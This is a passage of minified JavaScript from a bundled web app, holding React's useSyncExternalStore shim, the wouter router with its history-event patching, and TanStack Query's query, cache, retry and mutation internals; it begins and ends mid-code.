        a += ~r && !~s ? "(?:/([^/]+?))?" : "/([^/]+?)",
        ~s && (a += (~r ? "?" : "") + "\\" + o.substring(s))) : a += "/" + o;
    return {
        keys: i,
        pattern: new RegExp("^" + a + (t ? "(?=$|/)" : "/?$"),"i")
    }
}
var ey = {
    exports: {}
}
  , ty = {};
/**
 * @license React
 * use-sync-external-store-shim.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var ps = h;
function S_(e, t) {
    return e === t && (e !== 0 || 1 / e === 1 / t) || e !== e && t !== t
}
var __ = typeof Object.is == "function" ? Object.is : S_
  , E_ = ps.useState
  , b_ = ps.useEffect
  , C_ = ps.useLayoutEffect
  , k_ = ps.useDebugValue;
function T_(e, t) {
    var n = t()
      , r = E_({
        inst: {
            value: n,
            getSnapshot: t
        }
    })
      , o = r[0].inst
      , s = r[1];
    return C_(function() {
        o.value = n,
        o.getSnapshot = t,
        ec(o) && s({
            inst: o
        })
    }, [e, n, t]),
    b_(function() {
        return ec(o) && s({
            inst: o
        }),
        e(function() {
            ec(o) && s({
                inst: o
            })
        })
    }, [e]),
    k_(n),
    n
}
function ec(e) {
    var t = e.getSnapshot;
    e = e.value;
    try {
        var n = t();
        return !__(e, n)
    } catch {
        return !0
    }
}
function P_(e, t) {
    return t()
}
var N_ = typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u" ? P_ : T_;
ty.useSyncExternalStore = ps.useSyncExternalStore !== void 0 ? ps.useSyncExternalStore : N_;
ey.exports = ty;
var R_ = ey.exports;
const A_ = Gm.useInsertionEffect
  , O_ = typeof window < "u" && typeof window.document < "u" && typeof window.document.createElement < "u"
  , j_ = O_ ? h.useLayoutEffect : h.useEffect
  , M_ = A_ || j_
  , ny = e => {
    const t = h.useRef([e, (...n) => t[0](...n)]).current;
    return M_( () => {
        t[0] = e
    }
    ),
    t[1]
}
  , I_ = "popstate"
  , Of = "pushState"
  , jf = "replaceState"
  , L_ = "hashchange"
  , Nh = [I_, Of, jf, L_]
  , D_ = e => {
    for (const t of Nh)
        addEventListener(t, e);
    return () => {
        for (const t of Nh)
            removeEventListener(t, e)
    }
}
  , ry = (e, t) => R_.useSyncExternalStore(D_, e, t)
  , F_ = () => location.search
  , V_ = ({ssrSearch: e=""}={}) => ry(F_, () => e)
  , Rh = () => location.pathname
  , z_ = ({ssrPath: e}={}) => ry(Rh, e ? () => e : Rh)
  , $_ = (e, {replace: t=!1, state: n=null}={}) => history[t ? jf : Of](n, "", e)
  , U_ = (e={}) => [z_(e), $_]
  , Ah = Symbol.for("wouter_v3");
if (typeof history < "u" && typeof window[Ah] > "u") {
    for (const e of [Of, jf]) {
        const t = history[e];
        history[e] = function() {
            const n = t.apply(this, arguments)
              , r = new Event(e);
            return r.arguments = arguments,
            dispatchEvent(r),
            n
        }
    }
    Object.defineProperty(window, Ah, {
        value: !0
    })
}
const B_ = (e, t) => t.toLowerCase().indexOf(e.toLowerCase()) ? "~" + t : t.slice(e.length) || "/"
  , oy = (e="") => e === "/" ? "" : e
  , H_ = (e, t) => e[0] === "~" ? e.slice(1) : oy(t) + e
  , W_ = (e="", t) => B_(Oh(oy(e)), Oh(t))
  , Oh = e => {
    try {
        return decodeURI(e)
    } catch {
        return e
    }
}
  , sy = {
    hook: U_,
    searchHook: V_,
    parser: x_,
    base: "",
    ssrPath: void 0,
    ssrSearch: void 0,
    hrefs: e => e
}
  , iy = h.createContext(sy)
  , ta = () => h.useContext(iy)
  , ay = {}
  , ly = h.createContext(ay)
  , Z_ = () => h.useContext(ly)
  , iu = e => {
    const [t,n] = e.hook(e);
    return [W_(e.base, t), ny( (r, o) => n(H_(r, e.base), o))]
}
  , Mf = () => iu(ta())
  , uy = (e, t, n, r) => {
    const {pattern: o, keys: s} = t instanceof RegExp ? {
        keys: !1,
        pattern: t
    } : e(t || "*", r)
      , i = o.exec(n) || []
      , [a,...l] = i;
    return a !== void 0 ? [!0, ( () => {
        const u = s !== !1 ? Object.fromEntries(s.map( (d, p) => [d, l[p]])) : i.groups;
        let c = {
            ...l
        };
        return u && Object.assign(c, u),
        c
    }
    )(), ...r ? [a] : []] : [!1, null]
}
  , K_ = ({children: e, ...t}) => {
    var c, d;
    const n = ta()
      , r = t.hook ? sy : n;
    let o = r;
    const [s,i] = ((c = t.ssrPath) == null ? void 0 : c.split("?")) ?? [];
    i && (t.ssrSearch = i,
    t.ssrPath = s),
    t.hrefs = t.hrefs ?? ((d = t.hook) == null ? void 0 : d.hrefs);
    let a = h.useRef({})
      , l = a.current
      , u = l;
    for (let p in r) {
        const w = p === "base" ? r[p] + (t[p] || "") : t[p] || r[p];
        l === u && w !== u[p] && (a.current = u = {
            ...u
        }),
        u[p] = w,
        w !== r[p] && (o = u)
    }
    return h.createElement(iy.Provider, {
        value: o,
        children: e
    })
}
  , jh = ({children: e, component: t}, n) => t ? h.createElement(t, {
    params: n
}) : typeof e == "function" ? e(n) : e
  , Q_ = e => {
    let t = h.useRef(ay)
      , n = t.current;
    for (const r in e)
        e[r] !== n[r] && (n = e);
    return Object.keys(e).length === 0 && (n = e),
    t.current = n
}
  , Is = ({path: e, nest: t, match: n, ...r}) => {
    const o = ta()
      , [s] = iu(o)
      , [i,a,l] = n ?? uy(o.parser, e, s, t)
      , u = Q_({
        ...Z_(),
        ...a
    });
    if (!i)
        return null;
    const c = l ? h.createElement(K_, {
        base: l
    }, jh(r, u)) : jh(r, u);
    return h.createElement(ly.Provider, {
        value: u,
        children: c
    })
}
  , q_ = h.forwardRef( (e, t) => {
    const n = ta()
      , [r,o] = iu(n)
      , {to: s="", href: i=s, onClick: a, asChild: l, children: u, className: c, replace: d, state: p, ...w} = e
      , x = ny(S => {
        S.ctrlKey || S.metaKey || S.altKey || S.shiftKey || S.button !== 0 || (a == null || a(S),
        S.defaultPrevented || (S.preventDefault(),
        o(i, e)))
    }
    )
      , m = n.hrefs(i[0] === "~" ? i.slice(1) : n.base + i, n);
    return l && h.isValidElement(u) ? h.cloneElement(u, {
        onClick: x,
        href: m
    }) : h.createElement("a", {
        ...w,
        onClick: x,
        href: m,
        className: c != null && c.call ? c(r === i) : c,
        children: u,
        ref: t
    })
}
)
  , cy = e => Array.isArray(e) ? e.flatMap(t => cy(t && t.type === h.Fragment ? t.props.children : t)) : [e]
  , G_ = ({children: e, location: t}) => {
    const n = ta()
      , [r] = iu(n);
    for (const o of cy(e)) {
        let s = 0;
        if (h.isValidElement(o) && (s = uy(n.parser, o.props.path, t || r, o.props.nest))[0])
            return h.cloneElement(o, {
                match: s
            })
    }
    return null
}
;
var au = class {
    constructor() {
        this.listeners = new Set,
        this.subscribe = this.subscribe.bind(this)
    }
    subscribe(e) {
        return this.listeners.add(e),
        this.onSubscribe(),
        () => {
            this.listeners.delete(e),
            this.onUnsubscribe()
        }
    }
    hasListeners() {
        return this.listeners.size > 0
    }
    onSubscribe() {}
    onUnsubscribe() {}
}
  , lu = typeof window > "u" || "Deno"in globalThis;
function en() {}
function Y_(e, t) {
    return typeof e == "function" ? e(t) : e
}
function X_(e) {
    return typeof e == "number" && e >= 0 && e !== 1 / 0
}
function J_(e, t) {
    return Math.max(e + (t || 0) - Date.now(), 0)
}
function Mh(e, t) {
    return typeof e == "function" ? e(t) : e
}
function eE(e, t) {
    return typeof e == "function" ? e(t) : e
}
function Ih(e, t) {
    const {type: n="all", exact: r, fetchStatus: o, predicate: s, queryKey: i, stale: a} = e;
    if (i) {
        if (r) {
            if (t.queryHash !== If(i, t.options))
                return !1
        } else if (!Ci(t.queryKey, i))
            return !1
    }
    if (n !== "all") {
        const l = t.isActive();
        if (n === "active" && !l || n === "inactive" && l)
            return !1
    }
    return !(typeof a == "boolean" && t.isStale() !== a || o && o !== t.state.fetchStatus || s && !s(t))
}
function Lh(e, t) {
    const {exact: n, status: r, predicate: o, mutationKey: s} = e;
    if (s) {
        if (!t.options.mutationKey)
            return !1;
        if (n) {
            if (bi(t.options.mutationKey) !== bi(s))
                return !1
        } else if (!Ci(t.options.mutationKey, s))
            return !1
    }
    return !(r && t.state.status !== r || o && !o(t))
}
function If(e, t) {
    return ((t == null ? void 0 : t.queryKeyHashFn) || bi)(e)
}
function bi(e) {
    return JSON.stringify(e, (t, n) => fd(n) ? Object.keys(n).sort().reduce( (r, o) => (r[o] = n[o],
    r), {}) : n)
}
function Ci(e, t) {
    return e === t ? !0 : typeof e != typeof t ? !1 : e && t && typeof e == "object" && typeof t == "object" ? !Object.keys(t).some(n => !Ci(e[n], t[n])) : !1
}
function dy(e, t) {
    if (e === t)
        return e;
    const n = Dh(e) && Dh(t);
    if (n || fd(e) && fd(t)) {
        const r = n ? e : Object.keys(e)
          , o = r.length
          , s = n ? t : Object.keys(t)
          , i = s.length
          , a = n ? [] : {};
        let l = 0;
        for (let u = 0; u < i; u++) {
            const c = n ? u : s[u];
            (!n && r.includes(c) || n) && e[c] === void 0 && t[c] === void 0 ? (a[c] = void 0,
            l++) : (a[c] = dy(e[c], t[c]),
            a[c] === e[c] && e[c] !== void 0 && l++)
        }
        return o === i && l === o ? e : a
    }
    return t
}
function Dh(e) {
    return Array.isArray(e) && e.length === Object.keys(e).length
}
function fd(e) {
    if (!Fh(e))
        return !1;
    const t = e.constructor;
    if (t === void 0)
        return !0;
    const n = t.prototype;
    return !(!Fh(n) || !n.hasOwnProperty("isPrototypeOf") || Object.getPrototypeOf(e) !== Object.prototype)
}
function Fh(e) {
    return Object.prototype.toString.call(e) === "[object Object]"
}
function tE(e) {
    return new Promise(t => {
        setTimeout(t, e)
    }
    )
}
function nE(e, t, n) {
    return typeof n.structuralSharing == "function" ? n.structuralSharing(e, t) : n.structuralSharing !== !1 ? dy(e, t) : t
}
function rE(e, t, n=0) {
    const r = [...e, t];
    return n && r.length > n ? r.slice(1) : r
}
function oE(e, t, n=0) {
    const r = [t, ...e];
    return n && r.length > n ? r.slice(0, -1) : r
}
var Lf = Symbol();
function fy(e, t) {
    return !e.queryFn && (t != null && t.initialPromise) ? () => t.initialPromise : !e.queryFn || e.queryFn === Lf ? () => Promise.reject(new Error(`Missing queryFn: '${e.queryHash}'`)) : e.queryFn
}
var Kr, cr, Yo, Om, sE = (Om = class extends au {
    constructor() {
        super();
        me(this, Kr);
        me(this, cr);
        me(this, Yo);
        se(this, Yo, t => {
            if (!lu && window.addEventListener) {
                const n = () => t();
                return window.addEventListener("visibilitychange", n, !1),
                () => {
                    window.removeEventListener("visibilitychange", n)
                }
            }
        }
        )
    }
    onSubscribe() {
        A(this, cr) || this.setEventListener(A(this, Yo))
    }
    onUnsubscribe() {
        var t;
        this.hasListeners() || ((t = A(this, cr)) == null || t.call(this),
        se(this, cr, void 0))
    }
    setEventListener(t) {
        var n;
        se(this, Yo, t),
        (n = A(this, cr)) == null || n.call(this),
        se(this, cr, t(r => {
            typeof r == "boolean" ? this.setFocused(r) : this.onFocus()
        }
        ))
    }
    setFocused(t) {
        A(this, Kr) !== t && (se(this, Kr, t),
        this.onFocus())
    }
    onFocus() {
        const t = this.isFocused();
        this.listeners.forEach(n => {
            n(t)
        }
        )
    }
    isFocused() {
        var t;
        return typeof A(this, Kr) == "boolean" ? A(this, Kr) : ((t = globalThis.document) == null ? void 0 : t.visibilityState) !== "hidden"
    }
}
,
Kr = new WeakMap,
cr = new WeakMap,
Yo = new WeakMap,
Om), py = new sE, Xo, dr, Jo, jm, iE = (jm = class extends au {
    constructor() {
        super();
        me(this, Xo, !0);
        me(this, dr);
        me(this, Jo);
        se(this, Jo, t => {
            if (!lu && window.addEventListener) {
                const n = () => t(!0)
                  , r = () => t(!1);
                return window.addEventListener("online", n, !1),
                window.addEventListener("offline", r, !1),
                () => {
                    window.removeEventListener("online", n),
                    window.removeEventListener("offline", r)
                }
            }
        }
        )
    }
    onSubscribe() {
        A(this, dr) || this.setEventListener(A(this, Jo))
    }
    onUnsubscribe() {
        var t;
        this.hasListeners() || ((t = A(this, dr)) == null || t.call(this),
        se(this, dr, void 0))
    }
    setEventListener(t) {
        var n;
        se(this, Jo, t),
        (n = A(this, dr)) == null || n.call(this),
        se(this, dr, t(this.setOnline.bind(this)))
    }
    setOnline(t) {
        A(this, Xo) !== t && (se(this, Xo, t),
        this.listeners.forEach(r => {
            r(t)
        }
        ))
    }
    isOnline() {
        return A(this, Xo)
    }
}
,
Xo = new WeakMap,
dr = new WeakMap,
Jo = new WeakMap,
jm), El = new iE;
function aE() {
    let e, t;
    const n = new Promise( (o, s) => {
        e = o,
        t = s
    }
    );
    n.status = "pending",
    n.catch( () => {}
    );
    function r(o) {
        Object.assign(n, o),
        delete n.resolve,
        delete n.reject
    }
    return n.resolve = o => {
        r({
            status: "fulfilled",
            value: o
        }),
        e(o)
    }
    ,
    n.reject = o => {
        r({
            status: "rejected",
            reason: o
        }),
        t(o)
    }
    ,
    n
}
function lE(e) {
    return Math.min(1e3 * 2 ** e, 3e4)
}
function hy(e) {
    return (e ?? "online") === "online" ? El.isOnline() : !0
}
var my = class extends Error {
    constructor(e) {
        super("CancelledError"),
        this.revert = e == null ? void 0 : e.revert,
        this.silent = e == null ? void 0 : e.silent
    }
}
;
function tc(e) {
    return e instanceof my
}
function vy(e) {
    let t = !1, n = 0, r = !1, o;
    const s = aE()
      , i = m => {
        var S;
        r || (p(new my(m)),
        (S = e.abort) == null || S.call(e))
    }
      , a = () => {
        t = !0
    }
      , l = () => {
        t = !1
    }
      , u = () => py.isFocused() && (e.networkMode === "always" || El.isOnline()) && e.canRun()
      , c = () => hy(e.networkMode) && e.canRun()
      , d = m => {
        var S;
        r || (r = !0,
        (S = e.onSuccess) == null || S.call(e, m),
        o == null || o(),
        s.resolve(m))
    }
      , p = m => {
        var S;
        r || (r = !0,
        (S = e.onError) == null || S.call(e, m),
        o == null || o(),
        s.reject(m))
    }
      , w = () => new Promise(m => {
        var S;
        o = v => {
            (r || u()) && m(v)
        }
        ,
        (S = e.onPause) == null || S.call(e)
    }
    ).then( () => {
        var m;
        o = void 0,
        r || (m = e.onContinue) == null || m.call(e)
    }
    )
      , x = () => {
        if (r)
            return;
        let m;
        const S = n === 0 ? e.initialPromise : void 0;
        try {
            m = S ?? e.fn()
        } catch (v) {
            m = Promise.reject(v)
        }
        Promise.resolve(m).then(d).catch(v => {
            var T;
            if (r)
                return;
            const f = e.retry ?? (lu ? 0 : 3)
              , y = e.retryDelay ?? lE
              , _ = typeof y == "function" ? y(n, v) : y
              , b = f === !0 || typeof f == "number" && n < f || typeof f == "function" && f(n, v);
            if (t || !b) {
                p(v);
                return
            }
            n++,
            (T = e.onFail) == null || T.call(e, n, v),
            tE(_).then( () => u() ? void 0 : w()).then( () => {
                t ? p(v) : x()
            }
            )
        }
        )
    }
    ;
    return {
        promise: s,
        cancel: i,
        continue: () => (o == null || o(),
        s),
        cancelRetry: a,
        continueRetry: l,
        canStart: c,
        start: () => (c() ? x() : w().then(x),
        s)
    }
}
function uE() {
    let e = []
      , t = 0
      , n = a => {
        a()
    }
      , r = a => {
        a()
    }
      , o = a => setTimeout(a, 0);
    const s = a => {
        t ? e.push(a) : o( () => {
            n(a)
        }
        )
    }
      , i = () => {
        const a = e;
        e = [],
        a.length && o( () => {
            r( () => {
                a.forEach(l => {
                    n(l)
                }
                )
            }
            )
        }
        )
    }
    ;
    return {
        batch: a => {
            let l;
            t++;
            try {
                l = a()
            } finally {
                t--,
                t || i()
            }
            return l
        }
        ,
        batchCalls: a => (...l) => {
            s( () => {
                a(...l)
            }
            )
        }
        ,
        schedule: s,
        setNotifyFunction: a => {
            n = a
        }
        ,
        setBatchNotifyFunction: a => {
            r = a
        }
        ,
        setScheduler: a => {
            o = a
        }
    }
}
var gt = uE(), Qr, Mm, gy = (Mm = class {
    constructor() {
        me(this, Qr)
    }
    destroy() {
        this.clearGcTimeout()
    }
    scheduleGc() {
        this.clearGcTimeout(),
        X_(this.gcTime) && se(this, Qr, setTimeout( () => {
            this.optionalRemove()
        }
        , this.gcTime))
    }
    updateGcTime(e) {
        this.gcTime = Math.max(this.gcTime || 0, e ?? (lu ? 1 / 0 : 5 * 60 * 1e3))
    }
    clearGcTimeout() {
        A(this, Qr) && (clearTimeout(A(this, Qr)),
        se(this, Qr, void 0))
    }
}
,
Qr = new WeakMap,
Mm), es, ts, Bt, qr, ut, Qi, Gr, tn, Ln, Im, cE = (Im = class extends gy {
    constructor(t) {
        super();
        me(this, tn);
        me(this, es);
        me(this, ts);
        me(this, Bt);
        me(this, qr);
        me(this, ut);
        me(this, Qi);
        me(this, Gr);
        se(this, Gr, !1),
        se(this, Qi, t.defaultOptions),
        this.setOptions(t.options),
        this.observers = [],
        se(this, qr, t.client),
        se(this, Bt, A(this, qr).getQueryCache()),
        this.queryKey = t.queryKey,
        this.queryHash = t.queryHash,
        se(this, es, fE(this.options)),
        this.state = t.state ?? A(this, es),
        this.scheduleGc()
    }
    get meta() {
        return this.options.meta
    }
    get promise() {
        var t;
        return (t = A(this, ut)) == null ? void 0 : t.promise
    }
    setOptions(t) {
        this.options = {
            ...A(this, Qi),
            ...t
        },
        this.updateGcTime(this.options.gcTime)
    }
    optionalRemove() {
        !this.observers.length && this.state.fetchStatus === "idle" && A(this, Bt).remove(this)
    }
    setData(t, n) {
        const r = nE(this.state.data, t, this.options);
        return it(this, tn, Ln).call(this, {
            data: r,
            type: "success",
            dataUpdatedAt: n == null ? void 0 : n.updatedAt,
            manual: n == null ? void 0 : n.manual
        }),
        r
    }
    setState(t, n) {
        it(this, tn, Ln).call(this, {
            type: "setState",
            state: t,
            setStateOptions: n
        })
    }
    cancel(t) {
        var r, o;
        const n = (r = A(this, ut)) == null ? void 0 : r.promise;
        return (o = A(this, ut)) == null || o.cancel(t),
        n ? n.then(en).catch(en) : Promise.resolve()
    }
    destroy() {
        super.destroy(),
        this.cancel({
            silent: !0
        })
    }
    reset() {
        this.destroy(),
        this.setState(A(this, es))
    }
    isActive() {
        return this.observers.some(t => eE(t.options.enabled, this) !== !1)
    }
    isDisabled() {
        return this.getObserversCount() > 0 ? !this.isActive() : this.options.queryFn === Lf || this.state.dataUpdateCount + this.state.errorUpdateCount === 0
    }
    isStale() {
        return this.state.isInvalidated ? !0 : this.getObserversCount() > 0 ? this.observers.some(t => t.getCurrentResult().isStale) : this.state.data === void 0
    }
    isStaleByTime(t=0) {
        return this.state.isInvalidated || this.state.data === void 0 || !J_(this.state.dataUpdatedAt, t)
    }
    onFocus() {
        var n;
        const t = this.observers.find(r => r.shouldFetchOnWindowFocus());
        t == null || t.refetch({
            cancelRefetch: !1
        }),
        (n = A(this, ut)) == null || n.continue()
    }
    onOnline() {
        var n;
        const t = this.observers.find(r => r.shouldFetchOnReconnect());
        t == null || t.refetch({
            cancelRefetch: !1
        }),
        (n = A(this, ut)) == null || n.continue()
    }
    addObserver(t) {
        this.observers.includes(t) || (this.observers.push(t),
        this.clearGcTimeout(),
        A(this, Bt).notify({
            type: "observerAdded",
            query: this,
            observer: t
        }))
    }
    removeObserver(t) {
        this.observers.includes(t) && (this.observers = this.observers.filter(n => n !== t),
        this.observers.length || (A(this, ut) && (A(this, Gr) ? A(this, ut).cancel({
            revert: !0
        }) : A(this, ut).cancelRetry()),
        this.scheduleGc()),
        A(this, Bt).notify({
            type: "observerRemoved",
            query: this,
            observer: t
        }))
    }
    getObserversCount() {
        return this.observers.length
    }
    invalidate() {
        this.state.isInvalidated || it(this, tn, Ln).call(this, {
            type: "invalidate"
        })
    }
    fetch(t, n) {
        var l, u, c;
        if (this.state.fetchStatus !== "idle") {
            if (this.state.data !== void 0 && (n != null && n.cancelRefetch))
                this.cancel({
                    silent: !0
                });
            else if (A(this, ut))
                return A(this, ut).continueRetry(),
                A(this, ut).promise
        }
        if (t && this.setOptions(t),
        !this.options.queryFn) {
            const d = this.observers.find(p => p.options.queryFn);
            d && this.setOptions(d.options)
        }
        const r = new AbortController
          , o = d => {
            Object.defineProperty(d, "signal", {
                enumerable: !0,
                get: () => (se(this, Gr, !0),
                r.signal)
            })
        }
          , s = () => {
            const d = fy(this.options, n)
              , p = {
                client: A(this, qr),
                queryKey: this.queryKey,
                meta: this.meta
            };
            return o(p),
            se(this, Gr, !1),
            this.options.persister ? this.options.persister(d, p, this) : d(p)
        }
          , i = {
            fetchOptions: n,
            options: this.options,
            queryKey: this.queryKey,
            client: A(this, qr),
            state: this.state,
            fetchFn: s
        };
        o(i),
        (l = this.options.behavior) == null || l.onFetch(i, this),
        se(this, ts, this.state),
        (this.state.fetchStatus === "idle" || this.state.fetchMeta !== ((u = i.fetchOptions) == null ? void 0 : u.meta)) && it(this, tn, Ln).call(this, {
            type: "fetch",
            meta: (c = i.fetchOptions) == null ? void 0 : c.meta
        });
        const a = d => {
            var p, w, x, m;
            tc(d) && d.silent || it(this, tn, Ln).call(this, {
                type: "error",
                error: d
            }),
            tc(d) || ((w = (p = A(this, Bt).config).onError) == null || w.call(p, d, this),
            (m = (x = A(this, Bt).config).onSettled) == null || m.call(x, this.state.data, d, this)),
            this.scheduleGc()
        }
        ;
        return se(this, ut, vy({
            initialPromise: n == null ? void 0 : n.initialPromise,
            fn: i.fetchFn,
            abort: r.abort.bind(r),
            onSuccess: d => {
                var p, w, x, m;
                if (d === void 0) {
                    a(new Error(`${this.queryHash} data is undefined`));
                    return
                }
                try {
                    this.setData(d)
                } catch (S) {
                    a(S);
                    return
                }
                (w = (p = A(this, Bt).config).onSuccess) == null || w.call(p, d, this),
                (m = (x = A(this, Bt).config).onSettled) == null || m.call(x, d, this.state.error, this),
                this.scheduleGc()
            }
            ,
            onError: a,
            onFail: (d, p) => {
                it(this, tn, Ln).call(this, {
                    type: "failed",
                    failureCount: d,
                    error: p
                })
            }
            ,
            onPause: () => {
                it(this, tn, Ln).call(this, {
                    type: "pause"
                })
            }
            ,
            onContinue: () => {
                it(this, tn, Ln).call(this, {
                    type: "continue"
                })
            }
            ,
            retry: i.options.retry,
            retryDelay: i.options.retryDelay,
            networkMode: i.options.networkMode,
            canRun: () => !0
        })),
        A(this, ut).start()
    }
}
,
es = new WeakMap,
ts = new WeakMap,
Bt = new WeakMap,
qr = new WeakMap,
ut = new WeakMap,
Qi = new WeakMap,
Gr = new WeakMap,
tn = new WeakSet,
Ln = function(t) {
    const n = r => {
        switch (t.type) {
        case "failed":
            return {
                ...r,
                fetchFailureCount: t.failureCount,
                fetchFailureReason: t.error
            };
        case "pause":
            return {
                ...r,
                fetchStatus: "paused"
            };
        case "continue":
            return {
                ...r,
                fetchStatus: "fetching"
            };
        case "fetch":
            return {
                ...r,
                ...dE(r.data, this.options),
                fetchMeta: t.meta ?? null
            };
        case "success":
            return {
                ...r,
                data: t.data,
                dataUpdateCount: r.dataUpdateCount + 1,
                dataUpdatedAt: t.dataUpdatedAt ?? Date.now(),
                error: null,
                isInvalidated: !1,
                status: "success",
                ...!t.manual && {
                    fetchStatus: "idle",
                    fetchFailureCount: 0,
                    fetchFailureReason: null
                }
            };
        case "error":
            const o = t.error;
            return tc(o) && o.revert && A(this, ts) ? {
                ...A(this, ts),
                fetchStatus: "idle"
            } : {
                ...r,
                error: o,
                errorUpdateCount: r.errorUpdateCount + 1,
                errorUpdatedAt: Date.now(),
                fetchFailureCount: r.fetchFailureCount + 1,
                fetchFailureReason: o,
                fetchStatus: "idle",
                status: "error"
            };
        case "invalidate":
            return {
                ...r,
                isInvalidated: !0
            };
        case "setState":
            return {
                ...r,
                ...t.state
            }
        }
    }
    ;
    this.state = n(this.state),
    gt.batch( () => {
        this.observers.forEach(r => {
            r.onQueryUpdate()
        }
        ),
        A(this, Bt).notify({
            query: this,
            type: "updated",
            action: t
        })
    }
    )
}
,
Im);
function dE(e, t) {
    return {
        fetchFailureCount: 0,
        fetchFailureReason: null,
        fetchStatus: hy(t.networkMode) ? "fetching" : "paused",
        ...e === void 0 && {
            error: null,
            status: "pending"
        }
    }
}
function fE(e) {
    const t = typeof e.initialData == "function" ? e.initialData() : e.initialData
      , n = t !== void 0
      , r = n ? typeof e.initialDataUpdatedAt == "function" ? e.initialDataUpdatedAt() : e.initialDataUpdatedAt : 0;
    return {
        data: t,
        dataUpdateCount: 0,
        dataUpdatedAt: n ? r ?? Date.now() : 0,
        error: null,
        errorUpdateCount: 0,
        errorUpdatedAt: 0,
        fetchFailureCount: 0,
        fetchFailureReason: null,
        fetchMeta: null,
        isInvalidated: !1,
        status: n ? "success" : "pending",
        fetchStatus: "idle"
    }
}
var wn, Lm, pE = (Lm = class extends au {
    constructor(t={}) {
        super();
        me(this, wn);
        this.config = t,
        se(this, wn, new Map)
    }
    build(t, n, r) {
        const o = n.queryKey
          , s = n.queryHash ?? If(o, n);
        let i = this.get(s);
        return i || (i = new cE({
            client: t,
            queryKey: o,
            queryHash: s,
            options: t.defaultQueryOptions(n),
            state: r,
            defaultOptions: t.getQueryDefaults(o)
        }),
        this.add(i)),
        i
    }
    add(t) {
        A(this, wn).has(t.queryHash) || (A(this, wn).set(t.queryHash, t),
        this.notify({
            type: "added",
            query: t
        }))
    }
    remove(t) {
        const n = A(this, wn).get(t.queryHash);
        n && (t.destroy(),
        n === t && A(this, wn).delete(t.queryHash),
        this.notify({
            type: "removed",
            query: t
        }))
    }
    clear() {
        gt.batch( () => {
            this.getAll().forEach(t => {
                this.remove(t)
            }
            )
        }
        )
    }
    get(t) {
        return A(this, wn).get(t)
    }
    getAll() {
        return [...A(this, wn).values()]
    }
    find(t) {
        const n = {
            exact: !0,
            ...t
        };
        return this.getAll().find(r => Ih(n, r))
    }
    findAll(t={}) {
        const n = this.getAll();
        return Object.keys(t).length > 0 ? n.filter(r => Ih(t, r)) : n
    }
    notify(t) {
        gt.batch( () => {
            this.listeners.forEach(n => {
                n(t)
            }
            )
        }
        )
    }
    onFocus() {
        gt.batch( () => {
            this.getAll().forEach(t => {
                t.onFocus()
            }
            )
        }
        )
    }
    onOnline() {
        gt.batch( () => {
            this.getAll().forEach(t => {
                t.onOnline()
            }
            )
        }
        )
    }
}
,
wn = new WeakMap,
Lm), xn, ht, Yr, Sn, nr, Dm, hE = (Dm = class extends gy {
    constructor(t) {
        super();
        me(this, Sn);
        me(this, xn);
        me(this, ht);
        me(this, Yr);
        this.mutationId = t.mutationId,
        se(this, ht, t.mutationCache),
        se(this, xn, []),
        this.state = t.state || mE(),
        this.setOptions(t.options),
        this.scheduleGc()
    }
    setOptions(t) {
        this.options = t,
        this.updateGcTime(this.options.gcTime)
    }
    get meta() {
        return this.options.meta
    }
    addObserver(t) {
        A(this, xn).includes(t) || (A(this, xn).push(t),
        this.clearGcTimeout(),
        A(this, ht).notify({
            type: "observerAdded",
            mutation: this,
            observer: t
        }))
    }
    removeObserver(t) {
        se(this, xn, A(this, xn).filter(n => n !== t)),
        this.scheduleGc(),
        A(this, ht).notify({
            type: "observerRemoved",
            mutation: this,
            observer: t
        })
    }
    optionalRemove() {
        A(this, xn).length || (this.state.status === "pending" ? this.scheduleGc() : A(this, ht).remove(this))
    }
    continue() {
        var t;
        return ((t = A(this, Yr)) == null ? void 0 : t.continue()) ?? this.execute(this.state.variables)
    }
    async execute(t) {
        var o, s, i, a, l, u, c, d, p, w, x, m, S, v, f, y, _, b, T, k;
        se(this, Yr, vy({
            fn: () => this.options.mutationFn ? this.options.mutationFn(t) : Promise.reject(new Error("No mutationFn found")),
            onFail: (P, z) => {
                it(this, Sn, nr).call(this, {
                    type: "failed",
                    failureCount: P,
                    error: z
                })
            }
            ,
            onPause: () => {
                it(this, Sn, nr).call(this, {
                    type: "pause"
                })
            }
            ,
            onContinue: () => {
                it(this, Sn, nr).call(this, {
                    type: "continue"
                })
            }
            ,
            retry: this.options.retry ?? 0,
            retryDelay: this.options.retryDelay,
            networkMode: this.options.networkMode,
            canRun: () => A(this, ht).canRun(this)
        }));
        const n = this.state.status === "pending"
          , r = !A(this, Yr).canStart();
        try {
            if (!n) {
                it(this, Sn, nr).call(this, {
                    type: "pending",
                    variables: t,
                    isPaused: r
                }),
                await ((s = (o = A(this, ht).config).onMutate) == null ? void 0 : s.call(o, t, this));
                const z = await ((a = (i = this.options).onMutate) == null ? void 0 : a.call(i, t));
                z !== this.state.context && it(this, Sn, nr).call(this, {
                    type: "pending",
                    context: z,
                    variables: t,
                    isPaused: r
                })
            }
            const P = await A(this, Yr).start();
            return await ((u = (l = A(this, ht).config).onSuccess) == null ? void 0 : u.call(l, P, t, this.state.context, this)),
            await ((d = (c = this.options).onSuccess) == null ? void 0 : d.call(c, P, t, this.state.context)),
            await ((w = (p = A(this, ht).config).onSettled) == null ? void 0 : w.call(p, P, null, this.state.variables, this.state.context, this)),
            await ((m = (x = this.options).onSettled) == null ? void 0 : m.call(x, P, null, t, this.state.context)),
            it(this, Sn, nr).call(this, {
                type: "success",
                data: P
            }),
            P
        } catch (P) {
            try {
                throw await ((v = (S = A(this, ht).config).onError) == null ? void 0 : v.call(S, P, t, this.state.context, this)),
                await ((y = (f = this.options).onError) == null ? void 0 : y.call(f, P, t, this.state.context)),
                await ((b = (_ = A(this, ht).config).onSettled) == null ? void 0 : b.call(_, void 0, P, this.state.variables, this.state.context, this)),
                await ((k = (T = this.options).onSettled) == null ? void 0 : k.call(T, void 0, P, t, this.state.context)),
                P
            } finally {
                it(this, Sn, nr).call(this, {
                    type: "error",
                    error: P
                })
            }
        } finally {
            A(this, ht).runNext(this)
        }
    }
}
,
xn = new WeakMap,
ht = new WeakMap,
Yr = new WeakMap,
Sn = new WeakSet,
nr = function(t) {
    const n = r => {
        switch (t.type) {
        case "failed":
            return {
                ...r,
                failureCount: t.failureCount,
                failureReason: t.error
            };
        case "pause":
            return {
                ...r,
                isPaused: !0
            };
        case "continue":
            return {
                ...r,
